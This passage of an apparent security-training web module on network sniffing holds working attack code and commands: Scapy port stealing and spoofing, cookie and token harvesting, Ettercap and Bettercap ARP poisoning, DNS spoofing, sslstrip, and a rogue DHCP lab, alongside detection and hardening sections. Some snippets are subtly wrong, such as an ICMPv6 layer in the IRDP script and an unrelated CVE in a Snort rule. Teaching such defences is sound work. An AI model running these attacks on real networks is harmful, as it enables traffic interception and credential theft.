# Port stealing with Scapy
from scapy.all import *

# Target's MAC address (discovered through reconnaissance)
target_mac = "00:11:22:33:44:55"
target_ip = "192.168.1.100"

# Create frame with target's MAC as source
frame = Ether(src=target_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=target_ip)
sendp(frame, iface="eth0")

# Switch now associates target's MAC with our port
print("Port stealing attack initiated. Target traffic will be redirected.")</div>
                </div>

                <div class="grid-2">
                    <div class="feature-card">
                        <h4>⚡ Attack Benefits</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Temporary traffic interception</li>
                            <li>Minimal network disruption</li>
                            <li>Difficult to detect immediately</li>
                            <li>Can be combined with other attacks</li>
                        </ul>
                    </div>
                    <div class="feature-card">
                        <h4>⚠️ Limitations</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Temporary effect (target reclaims port)</li>
                            <li>Only works on same VLAN</li>
                            <li>May cause connectivity issues</li>
                            <li>Requires continuous maintenance</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🌐 IRDP (ICMP Router Discovery Protocol) Spoofing</h3>
                <p>IRDP spoofing allows attackers to become the default gateway for target hosts by sending malicious router advertisements.</p>
                
                <div class="subsection">
                    <h4>📖 IRDP Protocol Overview</h4>
                    <p>IRDP allows hosts to discover available routers on their network segment. Hosts send router solicitations, and routers respond with advertisements containing their IP addresses and preference levels.</p>

                    <div class="code-block">
# Normal IRDP Process
Host → Router Solicitation (ICMP Type 10)
Router → Router Advertisement (ICMP Type 9)
  - Router IP: 192.168.1.1
  - Preference: 100
  - Lifetime: 1800 seconds

# IRDP Spoofing Attack
Attacker → Router Advertisement (ICMP Type 9)
  - Router IP: 192.168.1.254 (attacker)
  - Preference: 200 (higher than legitimate)
  - Lifetime: 3600 seconds</div>
                </div>

                <div class="tool-showcase">
                    <div class="tool-card">
                        <h4>🔧 Scapy IRDP Spoofing</h4>
                        <div class="code-block">
from scapy.all import *

# Create malicious router advertisement
irdp_packet = IP(src="192.168.1.254", dst="224.0.0.1")/\
              ICMP(type=9, code=0)/\
              ICMPv6_RouterAdvertisement(preference=200, lifetime=3600)

# Send continuously
while True:
    send(irdp_packet)
    time.sleep(10)</div>
                    </div>

                    <div class="tool-card">
                        <h4>⚡ Attack Impact</h4>
                        <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                            <li>Become default gateway</li>
                            <li>Intercept all external traffic</li>
                            <li>Man-in-the-middle positioning</li>
                            <li>Passive traffic monitoring</li>
                            <li>DNS redirection opportunities</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🎭 MAC Address Spoofing</h3>
                <p>MAC spoofing involves changing the network interface's MAC address to impersonate another device on the network.</p>
                
                <div class="grid-2">
                    <div class="subsection">
                        <h4>💻 Windows MAC Spoofing</h4>
                        <div class="code-block">
# Method 1: Registry Edit (requires reboot)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0001" /v NetworkAddress /d "001122334455" /f

# Method 2: Device Manager
# Network Adapters → Properties → Advanced → Network Address

# Method 3: PowerShell
Get-NetAdapter | Set-NetAdapter -MacAddress "00:11:22:33:44:55"</div>
                    </div>

                    <div class="subsection">
                        <h4>🐧 Linux MAC Spoofing</h4>
                        <div class="code-block">
# Method 1: ifconfig
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up

# Method 2: ip command
ip link set dev eth0 down
ip link set dev eth0 address 00:11:22:33:44:55
ip link set dev eth0 up

# Method 3: macchanger
macchanger -m 00:11:22:33:44:55 eth0</div>
                    </div>
                </div>

                <div class="interactive-demo">
                    <h4>🔬 MAC Spoofing Impact Simulator</h4>
                    <div class="demo-controls">
                        <button class="btn" onclick="demonstrateMACSpoof()">Simulate MAC Spoofing</button>
                        <button class="btn btn-warning" onclick="showMACDefenses()">Show Defense Methods</button>
                        <button class="btn btn-danger" onclick="clearMACDemo()">Clear Output</button>
                    </div>
                    <div class="demo-output" id="macSpoofOutput">
Click "Simulate MAC Spoofing" to see the attack process...
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🔗 Session Hijacking via Sniffing</h3>
                <p>Sniffing can be the first step in session hijacking attacks, where attackers capture session tokens and impersonate legitimate users.</p>
                
                <div class="subsection">
                    <h4>🎯 Attack Methodology</h4>
                    <div class="attack-flow">
                        <div class="flow-step">🔍 Sniff Network Traffic</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">🍪 Extract Session Cookies</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">🔑 Analyze Session Tokens</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">👥 Impersonate User</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-step">💀 Maintain Access</div>
                    </div>
                </div>

                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🎯 Common Targets</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>HTTP session cookies</li>
                            <li>Authentication tokens</li>
                            <li>FTP credentials</li>
                            <li>Telnet sessions</li>
                            <li>Unencrypted login forms</li>
                        </ul>
                    </div>
                    <div class="feature-card">
                        <h4>🔧 Extraction Tools</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Wireshark cookie extraction</li>
                            <li>NetworkMiner credential harvesting</li>
                            <li>Ettercap plugin modules</li>
                            <li>Custom Python scripts</li>
                            <li>Browser developer tools</li>
                        </ul>
                    </div>
                </div>

                <div class="code-block">
# Extract HTTP cookies from packet capture
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# Extract credentials from FTP traffic
tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" -T fields -e ftp.request.arg

# Python script for session token extraction
import re
from scapy.all import *

def extract_sessions(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        # Extract session cookies
        cookies = re.findall(r'Set-Cookie: ([^;]+)', payload)
        for cookie in cookies:
            print(f"Cookie found: {cookie}")
        
        # Extract authentication tokens
        tokens = re.findall(r'Authorization: Bearer ([A-Za-z0-9\-\.\_\~\+\/]+=*)', payload)
        for token in tokens:
            print(f"Bearer token: {token}")

sniff(iface="eth0", prn=extract_sessions, filter="tcp port 80")</div>
            </div>

            <button class="btn btn-success" onclick="showSection('tools')">Next: Tools & Analysis →</button>
        </div>

        <!-- Tools Section -->
        <div id="tools" class="module-section">
            <h2 class="section-title">🛠️ Tools & Analysis Techniques</h2>
            
            <div class="card">
                <h3>🦈 Wireshark: The Ultimate Network Analyzer</h3>
                <p>Wireshark is the world's foremost network protocol analyzer, providing deep packet inspection and comprehensive traffic analysis capabilities.</p>
                
                <div class="subsection">
                    <h4>🚀 Advanced Wireshark Techniques</h4>
                    
                    <div class="grid-2">
                        <div>
                            <h5>🔍 Essential Display Filters</h5>
                            <div class="code-block">
# Protocol-specific filters
http.request.method == "POST"
dns.qry.name contains "malware"
tcp.flags.syn == 1 and tcp.flags.ack == 0
arp.opcode == 1

# IP and network filters
ip.src == 192.168.1.100
net 192.168.1.0/24
broadcast or multicast

# Advanced filtering
tcp.stream eq 0
http.response.code == 404
ssl.handshake.type == 1</div>
                        </div>
                        <div>
                            <h5>📊 Statistical Analysis</h5>
                            <div class="code-block">
# Wireshark Statistics Menu:
Statistics → Protocol Hierarchy
Statistics → Conversations
Statistics → Endpoints
Statistics → I/O Graphs

# Export statistics
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z endpoints,ip
tshark -r capture.pcap -q -z http,stat</div>
                        </div>
                    </div>
                </div>

                <div class="interactive-demo">
                    <h4>🔬 Wireshark Analysis Demo</h4>
                    <div class="demo-controls">
                        <button class="btn" onclick="demonstrateWireshark()">Start Analysis Demo</button>
                        <button class="btn" onclick="showWiresharkFilters()">Common Filters</button>
                        <button class="btn btn-warning" onclick="wiresharkTips()">Pro Tips</button>
                    </div>
                    <div class="demo-output" id="wiresharkOutput">
Click "Start Analysis Demo" to see Wireshark in action...
                    </div>
                </div>

                <div class="grid-3">
                    <div class="feature-card">
                        <h4>🕵️ Credential Hunting</h4>
                        <div class="code-block">
# Find unencrypted passwords
frame contains "password"
http.request.method == "POST" and frame contains "login"
ftp.request.command == "PASS"</div>
                    </div>

                    <div class="feature-card">
                        <h4>🚨 Attack Detection</h4>
                        <div class="code-block">
# Detect ARP spoofing
arp.duplicate-address-detected

# Find suspicious DNS
dns.qry.name matches "\\.tk$"
dns.flags.response == 0 and dns.count.answers > 0</div>
                    </div>

                    <div class="feature-card">
                        <h4>📱 Mobile Traffic</h4>
                        <div class="code-block">
# Mobile app analysis
http.user_agent contains "Mobile"
ssl.handshake.extensions_server_name contains "api"</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>💻 Command-Line Analysis Tools</h3>
                
                <div class="tool-showcase">
                    <div class="tool-card">
                        <h4>🐕 tcpdump - Command Line Packet Analyzer</h4>
                        <p>Powerful command-line packet analyzer for quick traffic inspection and automated monitoring.</p>
                        <div class="code-block">
# Basic packet capture
tcpdump -i eth0 -w capture.pcap

# Live analysis with filters
tcpdump -i eth0 host 192.168.1.100
tcpdump -i eth0 port 80 or port 443
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Advanced filtering
tcpdump -i eth0 -A 'port 80 and host google.com'
tcpdump -i eth0 -X 'icmp or arp'</div>
                    </div>

                    <div class="tool-card">
                        <h4>📊 netstat - Network Statistics</h4>
                        <p>Display network connections, routing tables, and network interface statistics.</p>
                        <div class="code-block">
# Active connections
netstat -an | grep ESTABLISHED
netstat -tulpn

# Routing table
netstat -rn

# Network statistics
netstat -s
netstat -i</div>
                    </div>

                    <div class="tool-card">
                        <h4>🔍 ss - Socket Statistics</h4>
                        <p>Modern replacement for netstat with more features and better performance.</p>
                        <div class="code-block">
# Show all TCP connections
ss -t -a

# Show listening ports
ss -l -n

# Process information
ss -p

# Filter by state
ss state established</div>
                    </div>

                    <div class="tool-card">
                        <h4>🕸️ NetworkMiner - Network Forensics</h4>
                        <p>Advanced network forensic analysis tool for extracting artifacts from network traffic.</p>
                        <div class="code-block">
# Features:
- Automatic host detection
- File extraction from HTTP/FTP
- Credential harvesting
- Certificate analysis
- Keyword searching
- Timeline reconstruction</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>⚔️ Attack Automation Tools</h3>
                
                <div class="tool-showcase">
                    <div class="tool-card">
                        <h4>🎯 Ettercap - Comprehensive MITM Suite</h4>
                        <p>Feature-rich suite for man-in-the-middle attacks with plugin support.</p>
                        <div class="code-block">
# GUI mode
ettercap -G

# Text mode ARP poisoning
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# DNS spoofing
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.0/24//

# Plugin usage
ettercap -T -M arp:remote -P find_conn /192.168.1.1// /192.168.1.0/24//</div>
                    </div>

                    <div class="tool-card">
                        <h4>⚡ Bettercap - Modern Attack Framework</h4>
                        <p>Modular, portable, and extensible MITM framework written in Go.</p>
                        <div class="code-block">
# Interactive session
bettercap -iface eth0

# Network discovery
net.probe on
net.show

# ARP spoofing
set arp.spoof.targets 192.168.1.100
arp.spoof on

# HTTP/HTTPS proxy
set http.proxy.sslstrip true
http.proxy on
https.proxy on</div>
                    </div>

                    <div class="tool-card">
                        <h4>🔧 Cain & Abel - Windows Password Recovery</h4>
                        <p>Windows-based password recovery tool with sniffing capabilities.</p>
                        <div class="code-block">
Features:
- Password hash cracking
- ARP poisoning attacks
- VoIP conversation recording
- Network password sniffing
- Wireless key recovery
- Cryptanalysis attacks</div>
                    </div>

                    <div class="tool-card">
                        <h4>🐍 Scapy - Packet Manipulation</h4>
                        <p>Python-based interactive packet manipulation program and library.</p>
                        <div class="code-block">
# Interactive packet crafting
from scapy.all import *

# Craft custom packets
packet = IP(dst="192.168.1.100")/TCP(dport=80)/Raw(load="GET / HTTP/1.1\r\n\r\n")
send(packet)

# Sniff and analyze
packets = sniff(count=10, filter="tcp port 80")
packets.summary()

# Custom protocol analysis
def packet_handler(packet):
    if packet.haslayer(HTTP):
        print(f"HTTP Request: {packet[HTTP].Method} {packet[HTTP].Path}")

sniff(prn=packet_handler, filter="tcp port 80")</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🔬 Advanced Packet Analysis Techniques</h3>
                
                <div class="subsection">
                    <h4>📊 Traffic Pattern Analysis</h4>
                    <div class="grid-2">
                        <div>
                            <h5>🕒 Temporal Analysis</h5>
                            <ul style="margin: 10px 0; padding-left: 20px;">
                                <li>Peak traffic hours identification</li>
                                <li>Anomalous time-based patterns</li>
                                <li>Periodic communication detection</li>
                                <li>Command and control beaconing</li>
                            </ul>
                        </div>
                        <div>
                            <h5>📈 Statistical Analysis</h5>
                            <ul style="margin: 10px 0; padding-left: 20px;">
                                <li>Protocol distribution analysis</li>
                                <li>Conversation flow mapping</li>
                                <li>Bandwidth utilization patterns</li>
                                <li>Error rate correlations</li>
                            </ul>
                        </div>
                    </div>
                </div>

                <div class="code-block">
# Advanced tshark analysis
# Extract HTTP hosts and count requests
tshark -r capture.pcap -Y http.request -T fields -e http.host | sort | uniq -c | sort -nr

# Analyze DNS queries
tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name | sort | uniq -c

# TCP conversation analysis
tshark -r capture.pcap -q -z conv,tcp | head -20

# Generate I/O graph data
tshark -r capture.pcap -q -z io,stat,1</div>

                <div class="interactive-demo">
                    <h4>🔬 Packet Analysis Workshop</h4>
                    <div class="demo-controls">
                        <button class="btn" onclick="analyzeTrafficPatterns()">Analyze Traffic Patterns</button>
                        <button class="btn" onclick="detectAnomalies()">Detect Anomalies</button>
                        <button class="btn btn-warning" onclick="extractCredentials()">Extract Credentials</button>
                        <button class="btn btn-danger" onclick="clearAnalysisOutput()">Clear Output</button>
                    </div>
                    <div class="demo-output" id="analysisOutput">
Click any button above to start packet analysis demonstration...
                    </div>
                </div>
            </div>

            <button class="btn btn-success" onclick="showSection('countermeasures')">Next: Countermeasures & Defense →</button>
        </div>

        <!-- Countermeasures Section -->
        <div id="countermeasures" class="module-section">
            <h2 class="section-title">🛡️ Countermeasures & Defense Strategies</h2>
            
            <div class="card">
                <h3>🔍 Sniffing Detection Methods</h3>
                <p>Detecting network sniffing activities is crucial for maintaining network security. Various techniques can identify both passive and active sniffing attempts.</p>
                
                <div class="grid-2">
                    <div class="subsection">
                        <h4>🕵️ Promiscuous Mode Detection</h4>
                        <p>Identify network interfaces operating in promiscuous mode, which is required for most sniffing activities.</p>
                        
                        <div class="code-block">
# Linux detection methods
# Check interface flags
ip link show | grep PROMISC
ifconfig | grep PROMISC

# Monitor /proc/net/dev for unusual packet counts
cat /proc/net/dev

# Use ifpromisc tool
ifpromisc

# Advanced detection script
#!/bin/bash
for iface in $(ip link show | grep -E '^[0-9]+:' | cut -d: -f2 | tr -d ' '); do
    if ip link show $iface | grep -q PROMISC; then
        echo "WARNING: $iface is in promiscuous mode"
    fi
done</div>
                    </div>

                    <div class="subsection">
                        <h4>🎣 Ping Test Method</h4>
                        <p>Send packets with correct IP but wrong MAC to detect promiscuous interfaces.</p>
                        
                        <div class="code-block">
# Ping test for promiscuous detection
# Send packet with wrong MAC address
ping -c 1 192.168.1.100
arping -c 1 -T 192.168.1.100

# If host responds to wrong MAC, interface may be promiscuous
# Python implementation
from scapy.all import *

def detect_promisc(target_ip):
    # Get legitimate MAC
    real_mac = getmacbyip(target_ip)
    
    # Create packet with wrong MAC
    fake_mac = "00:00:00:00:00:01"
    packet = Ether(dst=fake_mac)/IP(dst=target_ip)/ICMP()
    
    response = srp1(packet, timeout=1, verbose=0)
    if response:
        print(f"{target_ip} may be in promiscuous mode")
    else:
        print(f"{target_ip} appears normal")</div>
                    </div>
                </div>

                <div class="feature-card">
                    <h4>🚨 Network Monitoring Indicators</h4>
                    <div class="grid-3">
                        <div>
                            <h5>📊 Traffic Anomalies</h5>
                            <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                                <li>Unusual broadcast traffic</li>
                                <li>Excessive ARP requests</li>
                                <li>Duplicate MAC addresses</li>
                                <li>Abnormal DHCP activity</li>
                            </ul>
                        </div>
                        <div>
                            <h5>⚠️ Behavioral Indicators</h5>
                            <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                                <li>Unexpected network latency</li>
                                <li>Connection timeouts</li>
                                <li>Routing table changes</li>
                                <li>DNS resolution issues</li>
                            </ul>
                        </div>
                        <div>
                            <h5>🔧 Technical Indicators</h5>
                            <ul style="margin: 10px 0; padding-left: 20px; font-size: 14px;">
                                <li>CAM table overflow alerts</li>
                                <li>Port security violations</li>
                                <li>DHCP pool exhaustion</li>
                                <li>Spanning tree changes</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🏰 Network Infrastructure Hardening</h3>
                
                <div class="subsection">
                    <h4>🔒 Switch Security Configuration</h4>
                    <div class="grid-2">
                        <div>
                            <h5>🛡️ Port Security</h5>
                            <div class="code-block">
# Cisco switch port security
interface GigabitEthernet0/1
switchport mode access
switchport port-security
switchport port-security maximum 2
switchport port-security mac-address sticky
switchport port-security violation shutdown
switchport port-security aging time 1
switchport port-security aging type inactivity</div>
                        </div>
                        <div>
                            <h5>🚫 DHCP Snooping</h5>
                            <div class="code-block">
# Enable DHCP snooping globally
ip dhcp snooping
ip dhcp snooping vlan 1-100

# Configure trusted ports
interface GigabitEthernet0/1
ip dhcp snooping trust

# Rate limiting
interface GigabitEthernet0/2
ip dhcp snooping limit rate 10</div>
                        </div>
                    </div>
                </div>

                <div class="subsection">
                    <h4>🔍 Dynamic ARP Inspection (DAI)</h4>
                    <p>DAI validates ARP packets against DHCP snooping database to prevent ARP spoofing attacks.</p>
                    
                    <div class="code-block">
# Configure Dynamic ARP Inspection
ip arp inspection vlan 1-100

# Trust interfaces connected to other switches/routers
interface GigabitEthernet0/1
ip arp inspection trust

# Configure ARP inspection filtering
arp access-list ARP_FILTER
permit ip host 192.168.1.1 mac host 0011.2233.4455
deny ip any mac any

interface GigabitEthernet0/2
ip arp inspection filter ARP_FILTER vlan 1</div>
                </div>

                <div class="interactive-demo">
                    <h4>🔧 Switch Configuration Demo</h4>
                    <div class="demo-controls">
                        <button class="btn" onclick="demonstratePortSecurity()">Configure Port Security</button>
                        <button class="btn" onclick="demonstrateDHCPSnooping()">Setup DHCP Snooping</button>
                        <button class="btn btn-warning" onclick="testSecurityFeatures()">Test Security Features</button>
                    </div>
                    <div class="demo-output" id="switchConfigOutput">
Select a configuration demo to begin...
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🔐 Encryption and Secure Protocols</h3>
                
                <div class="grid-2">
                    <div class="subsection">
                        <h4>🌐 Secure Communication Protocols</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><strong>HTTPS:</strong> Encrypted web traffic (TLS/SSL)</li>
                            <li><strong>SSH:</strong> Secure shell for remote access</li>
                            <li><strong>SFTP/SCP:</strong> Secure file transfer protocols</li>
                            <li><strong>IPSec:</strong> Network layer encryption</li>
                            <li><strong>WPA3:</strong> Latest wireless security standard</li>
                            <li><strong>DNSSEC:</strong> DNS Security Extensions</li>
                        </ul>
                    </div>

                    <div class="subsection">
                        <h4>🔑 Implementation Best Practices</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><strong>Certificate Pinning:</strong> Prevent certificate spoofing</li>
                            <li><strong>Perfect Forward Secrecy:</strong> Session key protection</li>
                            <li><strong>HSTS:</strong> HTTP Strict Transport Security</li>
                            <li><strong>Certificate Transparency:</strong> Public certificate logs</li>
                            <li><strong>OCSP Stapling:</strong> Certificate revocation checking</li>
                        </ul>
                    </div>
                </div>

                <div class="code-block">
# Implement secure protocols
# SSH configuration (/etc/ssh/sshd_config)
Protocol 2
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers alice bob

# HTTPS enforcement (.htaccess)
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

# HSTS header
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"</div>
            </div>

            <div class="card">
                <h3>🚨 Intrusion Detection Systems (IDS)</h3>
                
                <div class="tool-showcase">
                    <div class="tool-card">
                        <h4>🔍 Snort - Network IDS</h4>
                        <p>Open-source network intrusion detection system capable of real-time traffic analysis.</p>
                        <div class="code-block">
# Snort rules for sniffing detection
# Detect ARP spoofing
alert arp any any -> any any (msg:"ARP spoofing detected"; reference:cve,2019-5736; sid:1000001;)

# Detect MAC flooding
alert tcp any any -> any any (msg:"Potential MAC flood"; threshold: type both, track by_src, count 100, seconds 1; sid:1000002;)

# Detect DHCP starvation
alert udp any 68 -> any 67 (msg:"DHCP starvation attack"; threshold: type both, track by_src, count 50, seconds 10; sid:1000003;)</div>
                    </div>

                    <div class="tool-card">
                        <h4>🛡️ Suricata - Modern IDS/IPS</h4>
                        <p>High-performance network IDS, IPS, and network security monitoring engine.</p>
                        <div class="code-block">
# Suricata configuration for sniffing detection
# suricata.yaml
detect-engine:
  - profile: medium
  - custom-values:
      toclient-groups: 3
      toserver-groups: 25

# Custom rule for detecting sniffing tools
alert tcp any any -> any any (msg:"Wireshark detected"; content:"Wireshark"; nocase; sid:1000004;)</div>
                    </div>

                    <div class="tool-card">
                        <h4>📊 SIEM Integration</h4>
                        <p>Security Information and Event Management for comprehensive monitoring.</p>
                        <div class="code-block">
# Log sources for sniffing detection:
- Switch port security logs
- DHCP server logs  
- ARP table changes
- DNS query logs
- Network performance metrics
- IDS/IPS alerts

# Correlation rules:
- Multiple ARP requests from single source
- DHCP exhaustion + rogue server detection
- Promiscuous mode + suspicious traffic</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🔧 Network Segmentation Strategies</h3>
                
                <div class="grid-2">
                    <div class="feature-card">
                        <h4>🏢 VLAN Segmentation</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Isolate sensitive systems</li>
                            <li>Limit broadcast domains</li>
                            <li>Control inter-VLAN routing</li>
                            <li>Implement VLAN access control</li>
                        </ul>
                        
                        <div class="code-block">
# VLAN configuration
vlan 10
name MANAGEMENT
vlan 20  
name USERS
vlan 30
name SERVERS

interface range Gi0/1-10
switchport mode access
switchport access vlan 20</div>
                    </div>

                    <div class="feature-card">
                        <h4>🔥 Firewall Implementation</h4>
                        <ul style="margin: 10px 0; padding-left: 20px;">
                            <li>Network-based filtering</li>
                            <li>Application layer inspection</li>
                            <li>Stateful packet inspection</li>
                            <li>Intrusion prevention</li>
                        </ul>

                        <div class="code-block">
# iptables rules for sniffing protection
# Block promiscuous mode detection attempts
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Rate limit ARP requests
iptables -A INPUT -p arp -m limit --limit 10/min -j ACCEPT
iptables -A INPUT -p arp -j DROP</div>
                    </div>
                </div>
            </div>

            <button class="btn btn-success" onclick="showSection('labs')">Next: Hands-on Laboratory →</button>
        </div>

        <!-- Labs Section -->
        <div id="labs" class="module-section">
            <h2 class="section-title">🧪 Hands-on Laboratory Exercises</h2>
            
            <div class="card">
                <h3>🔬 Lab Environment Setup</h3>
                <p>Before starting the practical exercises, ensure you have the proper lab environment configured with necessary tools and target systems.</p>
                
                <div class="grid-2">
                    <div class="subsection">
                        <h4>💻 Required Software</h4>
                        <ul style="margin: 15px 0; padding-left: 20px; line-height: 1.8;">
                            <li><strong>Kali Linux:</strong> Primary attack platform</li>
                            <li><strong>Windows 10/11:</strong> Target system</li>
                            <li><strong>Ubuntu Server:</strong> Network services</li>
                            <li><strong>VirtualBox/VMware:</strong> Virtualization platform</li>
                            <li><strong>GNS3 (Optional):</strong> Network simulation</li>
                        </ul>
                    </div>

                    <div class="subsection">
                        <h4>🌐 Network Configuration</h4>
                        <div class="code-block">
# Virtual network setup
Network Segment: 192.168.100.0/24
Gateway: 192.168.100.1
Kali Linux: 192.168.100.10
Windows Target: 192.168.100.20
Ubuntu Server: 192.168.100.30

# Disable hardware offloading for packet capture
ethtool -K eth0 tx off rx off
ethtool -K eth0 gso off gro off lro off</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🥇 Lab 1: Passive Sniffing on Hub Network</h3>
                <div class="lab-simulator">
                    <h4>📋 Objective</h4>
                    <p>Understand passive sniffing techniques and capture unencrypted network traffic on a simulated hub network.</p>
                    
                    <h4>🎯 Scenario</h4>
                    <p>You are conducting a security assessment on a legacy network that still uses hubs. Your goal is to capture and analyze network traffic without generating any packets.</p>

                    <div class="subsection">
                        <h4>🔧 Lab Steps</h4>
                        <div class="terminal" id="lab1Terminal">
root@kali:~# Starting Lab 1: Passive Sniffing
root@kali:~# 
root@kali:~# Step 1: Verify network interface
root@kali:~# ip addr show eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:a1:b2:c3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.10/24 brd 192.168.100.255 scope global dynamic eth0

root@kali:~# Step 2: Enable promiscuous mode
root@kali:~# ip link set eth0 promisc on
root@kali:~# ip link show eth0 | grep PROMISC
2: eth0: <BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000

root@kali:~# Step 3: Start packet capture
root@kali:~# tcpdump -i eth0 -w passive_capture.pcap
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
                        </div>
                    </div>

                    <div class="demo-controls">
                        <button class="btn" onclick="simulateTraffic('lab1')">Generate Network Traffic</button>
                        <button class="btn btn-warning" onclick="analyzeCapture('lab1')">Analyze Captured Data</button>
                        <button class="btn btn-success" onclick="completeLab('lab1')">Complete Lab 1</button>
                    </div>

                    <div class="subsection">
                        <h4>📊 Expected Results</h4>
                        <ul style="margin: 15px 0; padding-left: 20px;">
                            <li>Successful promiscuous mode activation</li>
                            <li>Capture of all network segment traffic</li>
                            <li>Analysis of various protocol types</li>
                            <li>Identification of unencrypted data</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🥈 Lab 2: Active Sniffing with ARP Poisoning</h3>
                <div class="lab-simulator">
                    <h4>📋 Objective</h4>
                    <p>Perform active sniffing on a switched network using ARP poisoning to intercept traffic between two hosts.</p>
                    
                    <h4>🎯 Scenario</h4>
                    <p>The target network uses modern switches. You need to use ARP poisoning to position yourself as a man-in-the-middle and capture traffic between a client and the gateway.</p>

                    <div class="terminal" id="lab2Terminal">
root@kali:~# Starting Lab 2: ARP Poisoning Attack
root@kali:~# 
root@kali:~# Step 1: Network discovery
root@kali:~# nmap -sn 192.168.100.0/24
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.100.1
Host is up (0.001s latency).
Nmap scan report for 192.168.100.10 (kali)
Host is up (0.000s latency).
Nmap scan report for 192.168.100.20
Host is up (0.002s latency).

root@kali:~# Step 2: Enable IP forwarding
root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward

root@kali:~# Step 3: Start ARP poisoning with Ettercap
root@kali:~# ettercap -T -M arp:remote /192.168.100.1// /192.168.100.20//
                    </div>

                    <div class="demo-controls">
                        <button class="btn" onclick="startARPPoisoning('lab2')">Start ARP Poisoning</button>
                        <button class="btn" onclick="monitorTraffic('lab2')">Monitor Intercepted Traffic</button>
                        <button class="btn btn-warning" onclick="extractCredentials('lab2')">Extract Credentials</button>
                        <button class="btn btn-success" onclick="completeLab('lab2')">Complete Lab 2</button>
                    </div>

                    <div class="interactive-demo">
                        <h4>🔬 ARP Table Monitor</h4>
                        <div class="demo-output" id="arpTableMonitor">
Original ARP Table (Target: 192.168.100.20):
192.168.100.1    00:11:22:33:44:55    [Gateway]

Click "Start ARP Poisoning" to see the attack in progress...
                        </div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>🥉 Lab 3: DHCP Starvation and Rogue Server</h3>
                <div class="lab-simulator">
                    <h4>📋 Objective</h4>
                    <p>Execute a DHCP starvation attack followed by deploying a rogue DHCP server to control network configuration.</p>
                    
                    <h4>🎯 Scenario</h4>
                    <p>Target a network's DHCP infrastructure to gain control over client network configurations and potentially intercept their traffic.</p>

                    <div class="terminal" id="lab3Terminal">
root@kali:~# Starting Lab 3: DHCP Attack Scenario
root@kali:~# 
root@kali:~# Step 1: Identify DHCP server
root@kali:~# nmap -sU -p 67 192.168.100.0/24
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.100.1
Host is up (0.001s latency).
PORT   STATE SERVICE
67/udp open  dhcps

root@kali:~# Step 2: Configure rogue DHCP server
root@kali:~# cat > /etc/dhcp/dhcpd.conf << EOF
subnet 192.168.100.0 netmask 255.255.255.0 {
    range 192.168.100.50 192.168.100.100;
    option routers 192.168.100.10;
    option domain-name-servers 192.168.100.10;
    default-lease-time 600;
    max-lease-time 7200;
}
EOF
                    </div>

                    <div class="demo-controls">
                        <button class="btn" onclick="startDHCPStarvation('lab3')">Start DHCP Starvation</button>
                        <button class="btn" onclick="deployRogueDHCP('lab3')">Deploy Rogue DHCP</button>
                        <button class="btn btn-warning" onclick="captureClientTraffic('lab3')">Capture Client Traffic</button>
                        <button class="btn btn-success" onclick="completeLab('lab3')">Complete Lab 3</button>
                    </div>

                    <div class="grid-2">
                        <div class="feature-card">
                            <h4>📊 DHCP Pool Status</h4>
                            <div id="dhcpPoolStatus">
Available IPs: 192.168.100.100-192.168.100.200 (100 addresses)
Leased IPs: 5
